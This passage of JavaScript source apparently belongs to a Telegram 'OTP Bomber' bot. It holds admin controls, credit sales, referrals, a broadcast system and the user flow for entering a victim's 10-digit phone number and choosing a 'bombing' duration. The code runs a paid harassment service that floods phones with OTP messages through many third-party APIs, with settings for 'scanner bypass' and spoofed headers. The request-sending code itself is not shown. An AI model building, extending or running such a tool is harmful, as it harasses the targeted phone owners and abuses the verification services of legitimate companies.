        if (text === '🎟️ GEN CODE') {
            userStates.set(chatId, { state: 'gen_code' });
            bot.sendMessage(chatId, '💰 Send amount for the redeem code (max 1000):');
            return;
        }
        if (text === '🚫 BAN USER') {
            userStates.set(chatId, { state: 'ban_user' });
            bot.sendMessage(chatId, '🚫 Send user ID to ban:');
            return;
        }
        if (text === '✅ UNBAN USER') {
            userStates.set(chatId, { state: 'unban_user' });
            bot.sendMessage(chatId, '✅ Send user ID to unban:');
            return;
        }
        if (text === '💰 ADD CREDITS') {
            userStates.set(chatId, { state: 'add_credits' });
            bot.sendMessage(chatId, '💰 Send user ID:');
            return;
        }
        if (text === '➕ ADD PROTECTED') {
            userStates.set(chatId, { state: 'add_protected' });
            bot.sendMessage(chatId, '🛡️ Send 10-digit number to protect:');
            return;
        }
        if (text === '➖ REMOVE PROTECTED') {
            userStates.set(chatId, { state: 'remove_protected' });
            bot.sendMessage(chatId, '❌ Send 10-digit number to unprotect:');
            return;
        }
        if (text === '📋 PROTECTED LIST') {
            const list = await db.getProtected();
            bot.sendMessage(chatId, `🛡️ **Protected Numbers**\n${list.length ? list.join('\n') : 'None'}`);
            return;
        }
        if (text === '📢 BROADCAST') {
            if (!ADMIN_IDS.includes(Number(chatId))) return;
            
            const keyboard = {
                inline_keyboard: [
                    [{ text: '📤 Start Smart Broadcast', callback_data: 'smart_broadcast_start' }],
                    [{ text: '📊 Broadcast Stats', callback_data: 'smart_broadcast_stats' }],
                    [{ text: '❌ Cancel Broadcast', callback_data: 'smart_broadcast_cancel' }]
                ]
            };
            
            bot.sendMessage(
                chatId,
                `📢 **SMART BROADCAST SYSTEM**\n\n` +
                `🎯 **Universal Auto-Detect Broadcast**\n` +
                `Send ANY type of message and I'll detect & forward it!\n\n` +
                `✅ **Supported Types:**\n` +
                `📝 Text Messages\n` +
                `🖼️ Photos (with/without caption)\n` +
                `🎥 Videos (with/without caption)\n` +
                `📄 Documents (with/without caption)\n` +
                `🔊 Audio Files (with/without caption)\n` +
                `🎤 Voice Messages\n` +
                `🏷️ Stickers (static & animated)\n` +
                `🎬 GIFs/Animations\n` +
                `📊 Polls & Quizzes\n` +
                `📍 Location\n` +
                `📞 Contact\n` +
                `🎮 Game\n` +
                `📺 Video Notes\n` +
                `🔗 And MORE!\n\n` +
                `🚀 **How to use:**\n` +
                `1️⃣ Click "Start Smart Broadcast"\n` +
                `2️⃣ Send ANY message\n` +
                `3️⃣ Bot auto-detects and forwards to ALL users\n` +
                `4️⃣ Real-time progress shown!\n\n` +
                `⚠️ Send /cancel to exit broadcast mode`,
                { 
                    parse_mode: 'Markdown',
                    reply_markup: keyboard 
                }
            );
            return;
        }
        if (text === '📋 ALL USERS') {
            const users = await db.User.find().select('_id username credits');
            let page = 0;
            const perPage = 15;
            const totalPages = Math.ceil(users.length / perPage);
            const sendPage = async (pageNum) => {
                const start = pageNum * perPage;
                const end = start + perPage;
                const chunk = users.slice(start, end);
                let msg = '👥 **ALL USERS**\n\n';
                chunk.forEach(u => {
                    msg += `🆔 \`${u._id}\` | @${u.username || 'no_username'} | 💰${u.credits}\n`;
                });
                msg += `\nPage ${pageNum+1}/${totalPages}`;
                const markup = totalPages > 1 ? {
                    inline_keyboard: [
                        ...(pageNum > 0 ? [{ text: '◀️ Prev', callback_data: `allusers_${pageNum-1}` }] : []),
                        ...(pageNum < totalPages-1 ? [{ text: 'Next ▶️', callback_data: `allusers_${pageNum+1}` }] : [])
                    ]
                } : undefined;
                return bot.sendMessage(chatId, msg, { parse_mode: 'Markdown', reply_markup: markup });
            };
            await sendPage(0);
            userStates.set(chatId, { state: 'allusers', users, page: 0, perPage, totalPages });
            return;
        }
        if (text === '🔄 UNLIMITED PLAN') {
            userStates.set(chatId, { state: 'unlimited_plan' });
            bot.sendMessage(chatId, '⭐ Send user ID to grant 1-day unlimited bombing plan:');
            return;
        }
        if (text === '📺 CHANNEL MANAGER') {
            const keyboard = {
                inline_keyboard: [
                    [{ text: '➕ Add Channel', callback_data: 'channel_add' }],
                    [{ text: '➖ Remove Channel', callback_data: 'channel_remove' }],
                    [{ text: '📋 View Channels', callback_data: 'channel_view' }],
                    [{ text: '🔙 Back to Admin', callback_data: 'admin_back' }]
                ]
            };
            bot.sendMessage(chatId, '📺 **Channel Manager**\n\nManage required channels for referral/bot usage.', { reply_markup: keyboard });
            return;
        }
        if (text === '🛡️ SCANNER MANAGER') {
            const keyboard = {
                inline_keyboard: [
                    [{ text: '➕ Add Scanner', callback_data: 'scanner_add' }],
                    [{ text: '➖ Remove Scanner', callback_data: 'scanner_remove' }],
                    [{ text: '📋 View Scanners', callback_data: 'scanner_view' }],
                    [{ text: '🔄 Set Global Headers', callback_data: 'scanner_headers' }],
                    [{ text: '🔙 Back to Admin', callback_data: 'admin_back' }]
                ]
            };
            bot.sendMessage(chatId, '🛡️ **Scanner Manager**\n\nManage scanner bypass configurations.', { reply_markup: keyboard });
            return;
        }
    }

    // Main menu buttons
    if (text === '🔴 STOP BOMB') {
        if (bombingStatus.get(chatId)) {
            bombingStatus.set(chatId, false);
            bot.sendMessage(chatId, '⏹️ Bombing stopped.');
        } else {
            bot.sendMessage(chatId, '❌ No active bombing.');
        }
        return;
    }

    if (text.startsWith('🟢 START BOMB') || text.startsWith('🔵 START BOMB') || 
        text.startsWith('🟡 START BOMB') || text.startsWith('🔴 START BOMB') ||
        text.startsWith('🟣 START BOMB') || text.startsWith('🟠 START BOMB') ||
        text.startsWith('🟤 START BOMB')) {
        if (bombingStatus.get(chatId)) {
            return bot.sendMessage(chatId, '❌ You already have an active bombing session. Use /stop first.');
        }
        if (!await db.isJoined(chatId, bot)) {
            const channels = await db.getChannels();
            return bot.sendMessage(chatId, `🚫 Join required channels first:\n${channels.join('\n')}`);
        }
        bot.sendMessage(chatId, '📱 Send the 10-digit phone number to bomb:');
        userStates.set(chatId, { state: 'enter_phone' });
        return;
    }

    if (text === '💰 MY CREDITS') {
        const isUnlimited = user.daily_unlimited > Date.now() / 1000;
        const unlimitedText = isUnlimited ? '\n⭐ **Unlimited Plan Active!**' : '';
        bot.sendMessage(chatId, 
            `💰 **Your Credits:** \`${user.credits}\`${unlimitedText}\n⚔️ **Total Attacks:** ${user.total_attacks || 0}\n\n💡 Each minute costs 1 credit (max 10)\n⭐ 1 Day Unlimited: 100 credits`,  // UPDATED: 20 → 100
            { parse_mode: 'Markdown' }
        );
        return;
    }

    if (text === '🎁 DAILY SPIN') {
        const now = Date.now() / 1000;
        if (user.last_daily && user.last_daily > now - 86400) {
            const remaining = Math.ceil((user.last_daily + 86400 - now) / 60);
            return bot.sendMessage(chatId, `⏳ You already claimed today's spin! Try again in ${remaining} minutes.`);
        }
        const spins = ['🎲  ...', '⚙️  ...', '🎡  ...'];
        let spinMsg = await bot.sendMessage(chatId, '🎰  ...');
        for (const spin of spins) {
            await bot.editMessageText(spin, { chat_id: chatId, message_id: spinMsg.message_id });
            await new Promise(r => setTimeout(r, 300));
        }
        const reward = Math.floor(Math.random() * 10) + 1;
        await db.updateCredits(chatId, reward);
        user.last_daily = now;
        await user.save();
        const newBalance = (await db.getUser(chatId)).credits;
        await bot.editMessageText(`🎉 **You won ${reward} credits!**\n💰 New balance: ${newBalance}`, 
            { chat_id: chatId, message_id: spinMsg.message_id, parse_mode: 'Markdown' });
        return;
    }

    if (text === '🎟️ REDEEM CODE') {
        userStates.set(chatId, { state: 'redeem_code' });
        bot.sendMessage(chatId, '🎟️ Send the redeem code:');
        return;
    }

    if (text === '💳 BUY CREDITS') {
        const keyboard = {
            inline_keyboard: [
                [{ text: '10 Credits – ₹20', callback_data: 'buy_10' }],
                [{ text: '25 Credits – ₹40', callback_data: 'buy_25' }],
                [{ text: '50 Credits – ₹70', callback_data: 'buy_50' }],
                [{ text: '100 Credits – ₹120', callback_data: 'buy_100' }],
                [{ text: '⭐ Unlimited 1 Day – ₹150', callback_data: 'buy_unlimited' }],  // UPDATED: ₹50 → ₹150
            ]
        };
        bot.sendMessage(chatId, '💳 **Choose a plan:**', { parse_mode: 'Markdown', reply_markup: keyboard });
        return;
    }

    if (text === '🔗 REFERRAL') {
        if (!await db.isJoined(chatId, bot)) {
            const channels = await db.getChannels();
            return bot.sendMessage(chatId, `🚫 Join required channels first to use referral:\n${channels.join('\n')}`);
        }
        const code = await db.generateReferralCode(chatId);
        const botInfo = await bot.getMe();
        const refData = await db.getReferralData(chatId);
        const count = refData.count || 0;
        const msg = `🔗 **Your Referral Code**\n\n🎯 \`${code}\`\n\n📊 You have referred: ${count} users\n💰 You earned: ${count * 5} credits\n\n**How it works:**\n• Share your code with friends\n• When they join, both get 5 credits!\n• **Note:** Only 1 referral per minute (anti-spam)\n• Invite link: \`https://t.me/${botInfo.username}?start=${code}\``;
        bot.sendMessage(chatId, msg, { parse_mode: 'Markdown' });
        return;
    }

    if (text === '📊 MY STATS') {
        const sessions = user.bomb_sessions || [];
        const totalSessions = sessions.length;
        const totalSent = sessions.reduce((sum, s) => sum + (s.total_sent || 0), 0);
        const isUnlimited = user.daily_unlimited > Date.now() / 1000;
        bot.sendMessage(chatId, 
            `📊 **Your Stats**\n👤 ID: ${chatId}\n💰 Credits: ${user.credits}\n⚔️ Attacks: ${user.total_attacks || 0}\n📈 Sessions: ${totalSessions}\n📬 OTPs Sent: ${totalSent}\n⭐ Unlimited: ${isUnlimited ? '✅ Active' : '❌ Inactive'}`,
            { parse_mode: 'Markdown' }
        );
        return;
    }

    if (text === '❓ HELP') {
        bot.sendMessage(chatId, 
            `🤖 **BOT COMMANDS & HELP**\n\n📱 **/bomb** - Start bombing (choose duration)\n⏹️ **/stop** - Stop active bombing\n💰 **/credits** - Check your credits\n🎁 **/daily** - Daily spin wheel\n🎟️ **/redeem** - Redeem code\n🔗 **/referral** - Get referral link\n💳 **/buy** - Buy credits\n⚙️ **/settings** - Modify scanner/headers\n📊 **/stats** - View your stats\n\n💡 **Bombing Costs:**\n• 1-10 minutes: 1 credit per minute\n• 11-60 minutes: 10 credits\n• ⭐ 1 Day Unlimited: 100 credits\n\n⭐ **Referral Bonus:** 5 credits each!\n⚠️ **Anti-Spam:** Only 1 referral per minute`,
            { parse_mode: 'Markdown' }
        );
        return;
    }

    if (text === '⚙️ SETTINGS') {
        const keyboard = {
            inline_keyboard: [
                [{ text: '📋 View Settings', callback_data: 'settings_view' }],
                [{ text: '🔍 Add Scanner', callback_data: 'settings_add_scanner' }],
                [{ text: '📝 Modify Headers', callback_data: 'settings_modify_headers' }]
            ]
        };
        bot.sendMessage(chatId, '⚙️ **Settings Panel**\n\nHere you can manage scanner bypass and header modifications.', 
            { parse_mode: 'Markdown', reply_markup: keyboard });
        return;
    }

    // Handle state inputs
    if (userStates.has(chatId)) {
        const state = userStates.get(chatId);
        const input = text.trim();

        // Channel management states
        if (state.state === 'add_channel') {
            let channel = input;
            if (!channel.startsWith('@')) channel = '@' + channel;
            await db.addChannel(channel);
            bot.sendMessage(chatId, `✅ Channel ${channel} added successfully!`);
            userStates.delete(chatId);
            return;
        }
        if (state.state === 'remove_channel') {
            let channel = input;
            if (!channel.startsWith('@')) channel = '@' + channel;
            await db.removeChannel(channel);
            bot.sendMessage(chatId, `✅ Channel ${channel} removed successfully!`);
            userStates.delete(chatId);
            return;
        }

        // Scanner states
        if (state.state === 'add_scanner') {
            await db.addScanner(input);
            bot.sendMessage(chatId, '✅ Scanner added successfully!');
            userStates.delete(chatId);
            return;
        }
        if (state.state === 'remove_scanner') {
            const idx = parseInt(input) - 1;
            const success = await db.removeScanner(idx);
            bot.sendMessage(chatId, success ? '✅ Scanner removed successfully!' : '❌ Invalid scanner number.');
            userStates.delete(chatId);
            return;
        }
        if (state.state === 'set_global_headers') {
            try {
                const headers = JSON.parse(input);
                await db.updateGlobalHeaders(headers);
                bot.sendMessage(chatId, `✅ Global headers updated!\n${JSON.stringify(headers, null, 2)}`);
            } catch (e) {
                bot.sendMessage(chatId, '❌ Invalid JSON format.');
            }
            userStates.delete(chatId);
            return;
        }
        if (state.state === 'add_scanner_user') {
            const user = await db.getUser(chatId);
            user.scanner_enabled = true;
            user.scanner_data = input;
            await user.save();
            bot.sendMessage(chatId, '✅ Scanner bypass configured successfully!');
            userStates.delete(chatId);
            return;
        }
        if (state.state === 'modify_headers') {
            if (input === '/done') {
                const user = await db.getUser(chatId);
                user.custom_headers = state.headers || {};
                await user.save();
                bot.sendMessage(chatId, `✅ Headers saved! ${Object.keys(state.headers || {}).length} headers modified.`);
                userStates.delete(chatId);
                return;
            }
            if (input.includes(':')) {
                const parts = input.split(':', 1);
                const headerName = parts[0].trim();
                const headerValue = input.substring(parts[0].length + 1).trim();
                if (!state.headers) state.headers = {};
                state.headers[headerName] = headerValue;
                userStates.set(chatId, state);
                bot.sendMessage(chatId, `✅ Header added: \`${headerName}\`: \`${headerValue}\`\nSend more or /done`);
            } else {
                bot.sendMessage(chatId, '❌ Invalid format. Use `header_name: header_value`');
            }
            return;
        }

        // Admin states
        if (state.state === 'gen_code') {
            const amount = parseInt(input);
            if (isNaN(amount) || amount <= 0 || amount > 1000) return bot.sendMessage(chatId, '❌ Invalid amount. Max 1000.');
            const code = 'RTF' + Math.random().toString(36).substring(2, 7).toUpperCase();
            await db.createRedeemCode(code, amount);
            bot.sendMessage(chatId, `✅ Code: \`${code}\`\nAmount: ${amount} credits`, { parse_mode: 'Markdown' });
            userStates.delete(chatId);
            return;
        }

        if (state.state === 'ban_user') {
            const id = parseInt(input);
            if (isNaN(id)) return bot.sendMessage(chatId, '❌ Invalid ID.');
            await db.banUser(id);
            bot.sendMessage(chatId, `✅ Banned ${id}`);
            userStates.delete(chatId);
            return;
        }

        if (state.state === 'unban_user') {
            const id = parseInt(input);
            if (isNaN(id)) return bot.sendMessage(chatId, '❌ Invalid ID.');
            await db.unbanUser(id);
            bot.sendMessage(chatId, `✅ Unbanned ${id}`);
            userStates.delete(chatId);
            return;
        }

        if (state.state === 'add_credits') {
            const uid = parseInt(input);
            if (isNaN(uid)) return bot.sendMessage(chatId, '❌ Invalid ID.');
            userStates.set(chatId, { state: 'add_credits_amount', uid });
            bot.sendMessage(chatId, '💰 Send amount to add:');
            return;
        }
        if (state.state === 'add_credits_amount') {
            const amount = parseInt(input);
            if (isNaN(amount) || amount <= 0) return bot.sendMessage(chatId, '❌ Invalid amount.');
            await db.updateCredits(state.uid, amount);
            bot.sendMessage(chatId, `✅ Added ${amount} credits to ${state.uid}`);
            userStates.delete(chatId);
            return;
        }

        if (state.state === 'add_protected') {
            if (!input.match(/^\d{10}$/)) return bot.sendMessage(chatId, '❌ Invalid number. Must be 10 digits.');
            await db.addProtected(input);
            bot.sendMessage(chatId, `✅ ${input} added to protected list.`);
            userStates.delete(chatId);
            return;
        }

        if (state.state === 'remove_protected') {
            if (!input.match(/^\d{10}$/)) return bot.sendMessage(chatId, '❌ Invalid number. Must be 10 digits.');
            await db.removeProtected(input);
            bot.sendMessage(chatId, `✅ ${input} removed from protected list.`);
            userStates.delete(chatId);
            return;
        }

        if (state.state === 'unlimited_plan') {
            const uid = parseInt(input);
            if (isNaN(uid)) return bot.sendMessage(chatId, '❌ Invalid ID.');
            const target = await db.getUser(uid);
            target.daily_unlimited = Date.now() / 1000 + 86400;
            await target.save();
            bot.sendMessage(chatId, `✅ Unlimited plan granted to user ${uid} for 24 hours!`);
            try {
                await bot.sendMessage(uid, '⭐ **You\'ve been granted a 1-Day Unlimited Bombing Plan!**\n\nYou can now bomb any number for free for the next 24 hours!\nUse /bomb to start bombing.');
            } catch (e) {}
            userStates.delete(chatId);
            return;
        }

        if (state.state === 'redeem_code') {
            const amount = await db.getRedeemCode(input.toUpperCase());
            if (amount === null) {
                bot.sendMessage(chatId, '❌ Invalid code!');
            } else {
                await db.updateCredits(chatId, amount);
                bot.sendMessage(chatId, `✅ Redeemed ${amount} credits!`);
            }
            userStates.delete(chatId);
            return;
        }

        if (state.state === 'enter_phone') {
            const phone = input.replace(/\D/g, '');
            if (phone.length !== 10) return bot.sendMessage(chatId, '❌ Invalid number! Must be 10 digits.');
            userStates.set(chatId, { phone: phone });
            const keyboard = {
                inline_keyboard: [
                    [{ text: '🟢 1 Min (1 coin)', callback_data: 'dur_1' }, { text: '🟢 2 Min (2 coins)', callback_data: 'dur_2' }, { text: '🟢 3 Min (3 coins)', callback_data: 'dur_3' }],
                    [{ text: '🟢 5 Min (5 coins)', callback_data: 'dur_5' }, { text: '🟢 10 Min (10 coins)', callback_data: 'dur_10' }, { text: '🟢 30 Min (10 coins)', callback_data: 'dur_30' }],
                    [{ text: '🟢 60 Min (10 coins)', callback_data: 'dur_60' }, { text: '⭐ 1 Day (100 coins)', callback_data: 'dur_1440' }]  // UPDATED: 20 → 100
                ]
            };
            bot.sendMessage(chatId, `📱 Target: \`${phone}\`\n⏱️ **Select Bombing Duration:**`, 
                { parse_mode: 'Markdown', reply_markup: keyboard });
            return;
        }

        // All users pagination
        if (state.state === 'allusers') {
            // Handled via callback
        }
    }
});

// ===== SMART BROADCAST PROCESSING FUNCTION (OPTIMIZED) =====
async function processSmartBroadcast(chatId, msg) {
    try {
        // Get all users in batches (OPTIMIZED)
        const users = await db.User.find().select('_id');
        const totalUsers = users.length;
        
        if (totalUsers === 0) {
            return bot.sendMessage(chatId, '❌ No users found in database!');
        }
        
        // Show processing message
        const processingMsg = await bot.sendMessage(
            chatId,
            `⏳ **Preparing broadcast...**\n\n📊 Getting user list...`,
            { parse_mode: 'Markdown' }
        );
        
        // ===== DETECT MESSAGE TYPE =====
        let messageType = 'text';
        let mediaId = null;
        let caption = msg.caption || '';
        
        // Check ALL media types in correct order
        if (msg.photo) {
            messageType = 'photo';
            mediaId = msg.photo[msg.photo.length - 1].file_id;
            caption = msg.caption || '';
        } else if (msg.video) {
            messageType = 'video';
            mediaId = msg.video.file_id;
            caption = msg.caption || '';
        } else if (msg.document) {
            messageType = 'document';
            mediaId = msg.document.file_id;
            caption = msg.caption || '';
        } else if (msg.audio) {
            messageType = 'audio';
            mediaId = msg.audio.file_id;
            caption = msg.caption || '';
        } else if (msg.voice) {
            messageType = 'voice';
            mediaId = msg.voice.file_id;
            caption = msg.caption || '';
        } else if (msg.sticker) {
            messageType = 'sticker';
            mediaId = msg.sticker.file_id;
        } else if (msg.animation) {
            messageType = 'animation';
            mediaId = msg.animation.file_id;
            caption = msg.caption || '';
        } else if (msg.video_note) {
            messageType = 'video_note';
            mediaId = msg.video_note.file_id;
        } else if (msg.poll) {
            messageType = 'poll';
        } else if (msg.location) {
            messageType = 'location';
        } else if (msg.contact) {
            messageType = 'contact';
        } else if (msg.game) {
            messageType = 'game';
        } else if (msg.text) {
            messageType = 'text';
        }
        
        // ===== START BROADCASTING (OPTIMIZED: smaller batches) =====
        let success = 0, fail = 0, blocked = 0;
        const startTime = Date.now();
        const BROADCAST_BATCH = 5;  // Smaller batches for broadcast
        
        // Update initial progress
        await bot.editMessageText(
            `📢 **BROADCASTING...**\n\n` +
            `📊 **Total Users:** ${totalUsers}\n` +
            `✅ Success: 0\n` +
            `❌ Failed: 0\n` +
            `⏳ Progress: 0%\n` +
            `📎 Type: ${messageType.toUpperCase()}`,
            {
                chat_id: chatId,
                message_id: processingMsg.message_id,
                parse_mode: 'Markdown'
            }
        );
        
        // Send to each user with proper media handling
        for (let i = 0; i < users.length; i++) {
            const user = users[i];
            const targetId = user._id;
            
            try {
                // ===== SEND BASED ON MESSAGE TYPE =====
                switch (messageType) {
                    case 'text':
                        await bot.sendMessage(targetId, `📢 **BROADCAST**\n\n${msg.text}`, { 
                            parse_mode: 'Markdown',
                            disable_web_page_preview: true 
                        });
                        break;
                        
                    case 'photo':
                        await bot.sendPhoto(targetId, mediaId, { 
                            caption: caption ? `📢 **BROADCAST**\n\n${caption}` : '📢 **BROADCAST**',
                            parse_mode: 'Markdown'
                        });
                        break;
                        
                    case 'video':
                        await bot.sendVideo(targetId, mediaId, { 
                            caption: caption ? `📢 **BROADCAST**\n\n${caption}` : '📢 **BROADCAST**',
                            parse_mode: 'Markdown'
                        });
                        break;
                        
                    case 'document':
                        await bot.sendDocument(targetId, mediaId, { 
                            caption: caption ? `📢 **BROADCAST**\n\n${caption}` : '📢 **BROADCAST**',
                            parse_mode: 'Markdown'
                        });
                        break;
                        
                    case 'audio':
                        await bot.sendAudio(targetId, mediaId, { 
                            caption: caption ? `📢 **BROADCAST**\n\n${caption}` : '📢 **BROADCAST**',
                            parse_mode: 'Markdown'
                        });
                        break;
                        
                    case 'voice':
                        await bot.sendVoice(targetId, mediaId, { 
                            caption: caption ? `📢 **BROADCAST**\n\n${caption}` : '📢 **BROADCAST**',
                            parse_mode: 'Markdown'
                        });
                        break;
                        
                    case 'sticker':
                        await bot.sendSticker(targetId, mediaId);
                        break;
                        
                    case 'animation':
                        await bot.sendAnimation(targetId, mediaId, { 
                            caption: caption ? `📢 **BROADCAST**\n\n${caption}` : '📢 **BROADCAST**',
                            parse_mode: 'Markdown'
                        });
                        break;
                        
                    case 'video_note':
                        await bot.sendVideoNote(targetId, mediaId);
                        break;
                        
                    case 'poll':
                        await bot.sendPoll(
                            targetId,
                            msg.poll.question,
                            msg.poll.options.map(o => o.text),
                            { 
                                is_anonymous: msg.poll.is_anonymous,
                                type: msg.poll.type,
                                allows_multiple_answers: msg.poll.allows_multiple_answers
                            }
                        );
                        break;
                        
                    case 'location':
                        await bot.sendLocation(targetId, msg.location.latitude, msg.location.longitude);
                        break;
                        
                    case 'contact':
                        await bot.sendContact(targetId, msg.contact.phone_number, msg.contact.first_name, {
                            last_name: msg.contact.last_name || '',
                            vcard: msg.contact.vcard || ''
                        });
                        break;
                        
                    case 'game':
                        await bot.sendGame(targetId, msg.game.short_name);
                        break;
                        
                    default:
                        // Fallback: use forwardMessage for unknown types
                        await bot.forwardMessage(targetId, chatId, msg.message_id);
                }
                success++;
            } catch (error) {
                if (error.message && error.message.includes('bot was blocked')) {
                    blocked++;
                } else if (error.message && error.message.includes('chat not found')) {
                    blocked++;
                } else {
                    fail++;
                    console.error(`Failed to send to ${targetId}:`, error.message);
                }
            }
            
            // Update progress every 5 users
            if ((i + 1) % 5 === 0 || i === users.length - 1) {
                const processed = i + 1;
                const progress = Math.round((processed / totalUsers) * 100);
                const elapsed = Math.floor((Date.now() - startTime) / 1000);
                
                try {
                    await bot.editMessageText(
                        `📢 **BROADCASTING...**\n\n` +
                        `📊 **Total Users:** ${totalUsers}\n` +
                        `✅ Success: ${success}\n` +
                        `❌ Failed: ${fail}\n` +
                        `🚫 Blocked: ${blocked}\n` +
                        `⏳ Progress: ${progress}%\n` +
                        `⏱️ Elapsed: ${elapsed}s\n` +
                        `📎 Type: ${messageType.toUpperCase()}`,
                        {
                            chat_id: chatId,
                            message_id: processingMsg.message_id,
                            parse_mode: 'Markdown'
                        }
                    );
                } catch (e) {
                    // Ignore edit errors
                }
            }
            
            // Small delay to avoid rate limits
            await new Promise(r => setTimeout(r, 50));
        }
        
        // ===== BROADCAST COMPLETE =====
        const totalTime = Math.floor((Date.now() - startTime) / 1000);
        const successRate = totalUsers - blocked > 0 ? Math.round((success / (totalUsers - blocked)) * 100) : 0;
        
        await bot.editMessageText(
            `✅ **BROADCAST COMPLETED!**\n\n` +
            `📊 **Total Users:** ${totalUsers}\n` +
            `✅ **Success:** ${success}\n` +
            `❌ **Failed:** ${fail}\n` +
            `🚫 **Blocked:** ${blocked}\n` +
            `📈 **Success Rate:** ${successRate}%\n` +
            `⏱️ **Time Taken:** ${totalTime}s\n` +
            `📎 **Message Type:** ${messageType.toUpperCase()}\n\n` +
            `🔄 Use /broadcast to send another broadcast`,
            {
                chat_id: chatId,
                message_id: processingMsg.message_id,
                parse_mode: 'Markdown'
            }
        );
        
        // Store last broadcast info
        const state = adminBroadcastState.get(chatId) || {};
        state.last_broadcast = new Date().toLocaleString();
        state.success_count = success;
        state.fail_count = fail;
        state.blocked_count = blocked;
        adminBroadcastState.set(chatId, state);
        
        console.log(`📢 Broadcast completed: ${success}/${totalUsers} users, ${totalTime}s, Type: ${messageType}`);
        
    } catch (error) {
        console.error('Broadcast error:', error);
        bot.sendMessage(chatId, `❌ Broadcast failed: ${error.message}`);
    } finally {
        adminBroadcastState.delete(chatId);
    }
}

// ---------- ERROR HANDLING ----------
bot.on('polling_error', (err) => console.log(err));

console.log('🤖 Bot started successfully!');
console.log(`✅ Loaded ${uniqueApis.length} unique APIs`);
console.log('📢 Smart Broadcast System Loaded!');
console.log(`⚙️ Optimized: Batch size ${BATCH_SIZE}, Concurrency reduced, Memory monitoring enabled`);
console.log(`💰 Unlimited plan cost: 100 coins`);

// ---------- HEALTH CHECK SERVER ----------
const express = require('express');
const app = express();
const port = process.env.PORT || 10000;

// Health check endpoint (OPTIMIZED: for Render monitoring)
app.get('/health', (req, res) => {
    const mem = process.memoryUsage();
    res.json({
        status: 'ok',
        uptime: process.uptime(),
        memory: {
            heapUsed: (mem.heapUsed / 1024 / 1024).toFixed(2) + 'MB',
            heapTotal: (mem.heapTotal / 1024 / 1024).toFixed(2) + 'MB',
            rss: (mem.rss / 1024 / 1024).toFixed(2) + 'MB'
        },
        activeBombing: bombingStatus.size,
        totalAPIs: uniqueApis.length,
        bot: {
            username: bot.botInfo?.username || 'unknown',
            isRunning: true
        }
    });
});

// Detailed stats endpoint
app.get('/stats', async (req, res) => {
    try {
        const totalUsers = await db.User.countDocuments();
        const totalAttacks = (await db.User.aggregate([{ $group: { _id: null, total: { $sum: '$total_attacks' } } }]))[0]?.total || 0;
        const totalCredits = (await db.User.aggregate([{ $group: { _id: null, total: { $sum: '$credits' } } }]))[0]?.total || 0;
        const protectedList = await db.getProtected();
        const channels = await db.getChannels();
        
        res.json({
            users: totalUsers,
            totalAttacks,
            totalCredits,
            protected: protectedList.length,
            channels: channels.length,
            apis: uniqueApis.length,
            activeSessions: bombingStatus.size,
            memory: {
                heapUsed: (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2) + 'MB'
            }
        });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.get('/', (req, res) => {
    res.send('🤖 Telegram OTP Bomber Bot is running!\n\n' +
             '📊 Health: /health\n' +
             '📈 Stats: /stats');
});

app.listen(port, '0.0.0.0', () => {
    console.log(`✅ Health check server listening on port ${port}`);
});
